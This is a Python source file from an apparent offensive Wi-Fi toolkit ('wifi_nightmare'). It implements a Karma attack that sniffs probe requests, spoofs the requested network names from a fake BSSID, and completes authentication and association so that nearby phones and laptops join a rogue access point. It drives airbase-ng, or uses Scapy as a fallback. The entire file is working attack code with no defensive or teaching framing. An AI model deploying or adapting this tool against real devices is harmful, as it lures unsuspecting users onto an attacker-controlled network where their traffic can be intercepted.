# karma_attack.py
"""
Karma Attack — Respond to Probe Requests with matching Probe Responses.
Captures and lures devices searching for saved networks.
Supports native airbase-ng (AP mode with full Auth/Assoc negotiation)
and pure Python/Scapy engine with full Probe+Auth+Assoc state machine.
"""
import os
import sys
import time
import shutil
import threading
import subprocess
from dataclasses import dataclass, field
from typing import Set, Dict, List, Optional

try:
    from scapy.all import (
        sniff, sendp, RadioTap, Dot11, Dot11ProbeReq, Dot11ProbeResp,
        Dot11Auth, Dot11AssoReq, Dot11AssoResp, Dot11Elt
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

from wifi_nightmare.config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_WHITE, C_GREY, C_RESET
from wifi_nightmare.logger import logger


@dataclass
class ProbeEntry:
    client_mac: str
    ssid: str
    rssi: int
    seen_at: float = field(default_factory=time.time)
    responded: bool = False


class KarmaAttack:
    """
    Karma Attack:
    - Passively sniffs Probe Requests from surrounding devices (directed & broadcast)
    - Responds to matching Probe Requests claiming to be the requested AP
    - Completes 802.11 Authentication and Association handshakes so clients successfully connect
    """

    BROADCAST = "ff:ff:ff:ff:ff:ff"
    FAKE_BSSID = "02:00:00:11:22:33"

    def __init__(self, interface: str, target_ssids: List[str] = None,
                 channel: int = 6, respond_all: bool = True,
                 ignore_broadcast: bool = False, force_scapy: bool = False):
        self.interface = interface
        self.target_ssids = list(target_ssids) if target_ssids else []
        self.channel = channel
        self.respond_all = respond_all
        self.ignore_broadcast = ignore_broadcast
        self.force_scapy = force_scapy

        self.probe_log: Dict[str, ProbeEntry] = {}
        self.clients_attracted: Set[str] = set()
        self.clients_associated: Set[str] = set()
        self.stop_event = threading.Event()
        self._lock = threading.Lock()
        self._responded_count = 0
        self._proc: Optional[subprocess.Popen] = None

    def _set_channel(self):
        """Ensure interface is physically tuned to the target RF channel."""
        try:
            subprocess.run(["iw", "dev", self.interface, "set", "channel", str(self.channel)],
                           capture_output=True, timeout=2)
        except Exception:
            try:
                subprocess.run(["iwconfig", self.interface, "channel", str(self.channel)],
                               capture_output=True, timeout=2)
            except Exception:
                pass

    def _run_native_airbase(self) -> bool:
        """Run native airbase-ng Karma engine which provides a full soft-AP stack."""
        self._set_channel()
        cmd = ["airbase-ng", "-P", "-C", "30", "-c", str(self.channel)]

        if self.target_ssids:
            cmd.extend(["-e", self.target_ssids[0]])
        cmd.append(self.interface)

        print(f"\n{C_CYAN}[*] Karma Attack ACTIVE (Native airbase-ng Soft-AP Engine){C_RESET}")
        print(f"{C_YELLOW}[*] Channel: {self.channel} | Interface: {self.interface} | Ctrl+C to stop{C_RESET}")
        if self.target_ssids:
            print(f"{C_GREEN}[*] Target SSID Lure: '{self.target_ssids[0]}'{C_RESET}")
        else:
            print(f"{C_RED}[!] Full Karma Mode: Replying to ALL probe requests{C_RESET}")

        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            while not self.stop_event.is_set():
                if self._proc.poll() is not None:
                    break
                line = self._proc.stdout.readline()
                if not line:
                    time.sleep(0.05)
                    continue
                line_str = line.strip()
                if "Client" in line_str and "associated" in line_str:
                    print(f"\n{C_GREEN}[+] [KARMA SUCCESS] {line_str}{C_RESET}")
                elif "Created fake AP" in line_str:
                    print(f"{C_CYAN}[+] {line_str}{C_RESET}")

        except Exception as e:
            logger.error(f"airbase-ng error: {e}")
            return False
        finally:
            if self._proc and self._proc.poll() is None:
                try:
                    self._proc.terminate()
                    self._proc.wait(timeout=1.0)
                except Exception:
                    try:
                        self._proc.kill()
                    except Exception:
                        pass

        print(f"\n{C_CYAN}[+] Karma Attack finished.{C_RESET}")
        return True

    def _build_probe_response(self, client_mac: str, ssid: str) -> object:
        """Build compliant Probe Response frame."""
        resp = (
            RadioTap() /
            Dot11(type=0, subtype=5,
                  addr1=client_mac,
                  addr2=self.FAKE_BSSID,
                  addr3=self.FAKE_BSSID) /
            Dot11ProbeResp(
                timestamp=int(time.time() * 1_000_000),
                beacon_interval=100,
                cap=0x0421
            ) /
            Dot11Elt(ID='SSID', info=ssid.encode('utf-8', errors='ignore')) /
            Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') /
            Dot11Elt(ID='DSset', info=bytes([self.channel & 0xFF])) /
            Dot11Elt(ID=48,
                info=(
                    b'\x01\x00'
                    b'\x00\x0f\xac\x04'
                    b'\x01\x00'
                    b'\x00\x0f\xac\x04'
                    b'\x01\x00'
                    b'\x00\x0f\xac\x02'
                    b'\x00\x00'
                )
            )
        )
        return resp

    def _build_auth_response(self, client_mac: str) -> object:
        """Build 802.11 Open System Authentication Response (Seq 2, Status 0: Success)."""
        return (
            RadioTap() /
            Dot11(type=0, subtype=11,
                  addr1=client_mac,
                  addr2=self.FAKE_BSSID,
                  addr3=self.FAKE_BSSID) /
            Dot11Auth(algo=0, seqnum=2, status=0)
        )

    def _build_assoc_response(self, client_mac: str) -> object:
        """Build 802.11 Association Response (Status 0: Success, AID 1)."""
        return (
            RadioTap() /
            Dot11(type=0, subtype=1,
                  addr1=client_mac,
                  addr2=self.FAKE_BSSID,
                  addr3=self.FAKE_BSSID) /
            Dot11AssoResp(cap=0x0421, status=0, aid=1) /
            Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
        )

    def _packet_handler(self, pkt):
        if self.stop_event.is_set():
            return
        if not pkt.haslayer(Dot11):
            return

        dot11 = pkt[Dot11]
        client_mac = dot11.addr2
        if not client_mac or client_mac == self.BROADCAST:
            return

        # Case 1: Handle Authentication Request (Client attempting to authenticate to our rogue BSSID)
        if dot11.type == 0 and dot11.subtype == 11:
            dest = dot11.addr1
            if dest and dest.lower() == self.FAKE_BSSID.lower():
                try:
                    auth_resp = self._build_auth_response(client_mac)
                    sendp(auth_resp, iface=self.interface, verbose=0)
                    print(f"\n{C_CYAN}[*] [AUTH ACCEPTED] Client {client_mac} authenticated to rogue AP{C_RESET}")
                except Exception:
                    pass
                return

        # Case 2: Handle Association Request (Client attempting to associate with our rogue BSSID)
        if dot11.type == 0 and dot11.subtype == 0:
            dest = dot11.addr1
            if dest and dest.lower() == self.FAKE_BSSID.lower():
                try:
                    assoc_resp = self._build_assoc_response(client_mac)
                    sendp(assoc_resp, iface=self.interface, verbose=0)
                    with self._lock:
                        self.clients_associated.add(client_mac)
                    print(f"\n{C_GREEN}[+] [CLIENT ASSOCIATED] Client {client_mac} successfully connected!{C_RESET}")
                except Exception:
                    pass
                return

        # Case 3: Handle Probe Requests
        if not pkt.haslayer(Dot11ProbeReq):
            return

        ssid = ""
        if pkt.haslayer(Dot11Elt):
            elt = pkt[Dot11Elt]
            while elt:
                if elt.ID == 0:
                    try:
                        ssid = elt.info.decode('utf-8', errors='replace').strip('\x00')
                    except Exception:
                        ssid = ""
                    break
                elt = elt.payload if hasattr(elt, 'payload') else None

        # Resolve lure SSID for modern broadcast (wildcard) probes
        lure_ssid = None
        if not ssid:
            # Modern phone sent wildcard probe
            if self.ignore_broadcast:
                return
            if self.target_ssids:
                lure_ssid = self.target_ssids[0]
            elif self.respond_all:
                lure_ssid = "FreeWifi"
        else:
            # Directed probe
            if self.target_ssids:
                if ssid in self.target_ssids:
                    lure_ssid = ssid
                elif self.respond_all:
                    lure_ssid = ssid
            elif self.respond_all:
                lure_ssid = ssid

        if not lure_ssid:
            return

        key = f"{client_mac}|{lure_ssid}"
        with self._lock:
            entry = self.probe_log.get(key)
            now = time.time()
            if entry and entry.responded and (now - entry.seen_at) < 2.0:
                return

            rssi = getattr(pkt, 'dBm_AntSignal', -70)
            self.probe_log[key] = ProbeEntry(
                client_mac=client_mac, ssid=lure_ssid,
                rssi=rssi, responded=True
            )

        try:
            resp = self._build_probe_response(client_mac, lure_ssid)
            sendp(resp, iface=self.interface, verbose=0)
            self._responded_count += 1
            with self._lock:
                self.clients_attracted.add(client_mac)
            probe_label = f"'{ssid}'" if ssid else "<broadcast>"
            print(f"\n{C_GREEN}[+] Karma: Responded to {client_mac} ({probe_label} -> spoofing '{lure_ssid}'){C_RESET}")
        except Exception as e:
            logger.debug(f"Karma response error: {e}")

    def _run_scapy(self):
        """Pure Scapy Karma implementation with complete Auth & Assoc responders."""
        self._set_channel()
        print(f"\n{C_CYAN}[*] Karma Attack ACTIVE (Scapy Soft-AP & Probe Engine) on {self.interface}{C_RESET}")
        print(f"{C_YELLOW}[*] Hardware Channel: {self.channel} | Ctrl+C to stop{C_RESET}")
        if self.target_ssids:
            print(f"{C_GREEN}[*] Luring target SSIDs: {', '.join(self.target_ssids)}{C_RESET}")
        else:
            print(f"{C_RED}[!] RESPOND-ALL mode: Replying to ALL probe requests{C_RESET}")
        print(f"{C_YELLOW}[*] Responding to Probes + Auto-Accepting Auth & Assoc frames{C_RESET}\n")

        while not self.stop_event.is_set():
            try:
                sniff(iface=self.interface,
                      prn=self._packet_handler,
                      count=0, timeout=1, store=0,
                      stop_filter=lambda p: self.stop_event.is_set())
            except Exception as e:
                logger.debug(f"Karma sniff error: {e}")

        print(f"\n{C_CYAN}[+] Karma Attack stopped.{C_RESET}")
        print(f"    Probes caught     : {len(self.probe_log)}")
        print(f"    Unique probes lured: {len(self.clients_attracted)}")
        print(f"    Associated clients: {len(self.clients_associated)}")
        print(f"    Responses sent    : {self._responded_count}")

    def run(self):
        # Prefer native airbase-ng if installed
        if not self.force_scapy and shutil.which("airbase-ng"):
            if self._run_native_airbase():
                return

        if not HAS_SCAPY:
            print(f"{C_RED}[!] Neither airbase-ng nor Scapy available for Karma attack.{C_RESET}")
            return

        self._run_scapy()

    def get_probe_log(self) -> List[ProbeEntry]:
        with self._lock:
            return list(self.probe_log.values())

    def stop(self):
        self.stop_event.set()
        if self._proc and self._proc.poll() is None:
            try:
                self._proc.terminate()
            except Exception:
                pass
